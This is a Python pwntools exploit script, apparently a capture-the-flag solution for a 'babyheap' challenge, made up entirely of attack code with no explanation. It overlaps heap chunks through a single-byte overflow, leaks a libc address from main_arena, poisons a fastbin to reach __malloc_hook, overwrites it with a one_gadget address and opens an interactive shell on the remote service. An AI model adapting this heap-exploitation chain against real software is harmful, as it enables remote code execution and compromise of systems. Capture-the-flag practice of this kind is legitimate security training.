from pwn import *

context.log_level = "debug"
context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

local = 0
if local:
    # p = process("./babyheap")
    p = remote("172.17.0.2", 1234)
    # gdb.attach(p)
    raw_input("go")
else:
    p = remote("babyheap.2018.teamrois.cn", 3154)
    # raw_input("go")

def alloc(size, content):
    p.sendlineafter("choice: ", '1')
    p.sendlineafter(" input chunk size: ", str(size))
    p.recvuntil("input chunk content: ")
    p.send(content)

def show(index):
    p.sendlineafter("choice: ", '2')
    p.sendlineafter(" input chunk index: ", str(index))

def delete(index):
    p.sendlineafter("choice: ", '3')
    p.sendlineafter(" input chunk index: ", str(index))

alloc(0x40-8, 'a\n') # 0
alloc(0x100, 'b'*0xf0+p64(0x100)+'\n') # 1
alloc(0x100, 'c\n') # 2
alloc(0x40, 'p\n') # 3

delete(1)
delete(0)
alloc(0x40-8, 'a'*0x38) # 0

alloc(0x80, 'd\n') # 1
alloc(0x30, 'e\n') # 4
alloc(0x20, 'f\n') # 5
# show(1)
# delete(4)

delete(1)
delete(2)
payload = "f"*0x80 + p64(0) + p64(0x41)
alloc(0xd0-8, payload+'\n') # 1

# delete(1)
# alloc(0xd0, 'ff\n')
show(5)
p.recvuntil("content: ")
data = p.recvuntil("\n").strip()
main_arena_88 = u64(data.ljust(8, '\x00'))
libc_base = main_arena_88 - 88 - 0x3c4b20

malloc_hook_addr = libc_base + 0x3c4b10
info("malloc_hook_addr is : {}".format(hex(malloc_hook_addr)))

one_gadget = libc_base + 0x4526a

alloc(0x100, 'c\n') # 2
alloc(0x40-8, 'a\n') # 6

alloc(0x40-8, 'a\n') # 7
alloc(0x100, 'b'*0xf0+p64(0x100)+'\n') # 8
alloc(0x100, 'c\n') # 9
alloc(0x40, 'p\n') # 10

delete(7)
delete(8)
alloc(0x40-8, 'a'*0x38) # 7

alloc(0x80, 'd\n') # 8
alloc(0x60, p64(0x7f)+'\n') # 11

delete(8)
delete(9)
payload = "f"*0x80 + p64(0) + p64(0x71)
alloc(0xf0, payload+'\n') # 8

delete(11)
delete(8)
payload = "f"*0x80 + p64(0) + p64(0x71) + p64(malloc_hook_addr-0x23)
alloc(0xf0, payload+'\n')

alloc(0x60, 'dd\n')
alloc(0x60, '\x00'*3+p64(0)*2+p64(one_gadget)+'\n')
p.sendlineafter("choice: ", '1')
p.sendlineafter(" input chunk size: ", str(0x40))


p.interactive()
